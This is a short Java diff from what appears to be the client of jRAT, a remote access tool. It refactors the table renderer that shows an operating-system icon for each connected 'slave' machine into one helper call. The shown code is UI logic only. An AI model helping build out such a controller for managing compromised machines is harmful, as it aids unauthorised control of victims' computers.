@@ -4,7 +4,6 @@ import java.awt.Color;
 import java.awt.Component;
 import java.net.URL;
 
-import javax.swing.ImageIcon;
 import javax.swing.JCheckBox;
 import javax.swing.JLabel;
 import javax.swing.JTable;
@@ -16,19 +15,11 @@ import se.jrat.client.settings.Colors;
 import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
-import se.jrat.common.OperatingSystem;
 import se.jrat.common.Version;
 
 
 @SuppressWarnings("serial")
 public class MainTableRenderer extends DefaultTableCellRenderer {
-
-	public static final ImageIcon OS_WIN = IconUtils.getIcon("os");
-	public static final ImageIcon OS_WIN8 = IconUtils.getIcon("os_win8");
-	public static final ImageIcon OS_MAC = IconUtils.getIcon("os_mac");
-	public static final ImageIcon OS_LINUX = IconUtils.getIcon("os_linux");
-	public static final ImageIcon OS_ANDROID = IconUtils.getIcon("NONE"); //TODO
-	public static final ImageIcon OS_OTHERS = IconUtils.getIcon("last_modified");
 
 	public MainTableRenderer() {
 		setOpaque(true);
@@ -50,21 +41,7 @@ public class MainTableRenderer extends DefaultTableCellRenderer {
 		if (column == 4) {
 			lbl.setIcon(IconUtils.getPingIcon(slave));
 		} else if (column == 6) {
-			if (slave.getOS() == OperatingSystem.WINDOWS) {
-				if (slave.getOperatingSystem().startsWith("Windows 8")) {
-					lbl.setIcon(OS_WIN8);
-				} else {
-					lbl.setIcon(OS_WIN);
-				}
-			} else if (slave.getOS() == OperatingSystem.OSX) {
-				lbl.setIcon(OS_MAC);
-			} else if (slave.getOS() == OperatingSystem.LINUX) {
-				lbl.setIcon(OS_LINUX);
-			} else if (slave.getOS() == OperatingSystem.ANDROID) {
-				lbl.setIcon(OS_ANDROID);
-			} else {
-				lbl.setIcon(OS_OTHERS);
-			}
+			lbl.setIcon(IconUtils.getOSIcon(slave));
 		} else if (column == 0 && !Frame.thumbnails) {
 			String path;
 
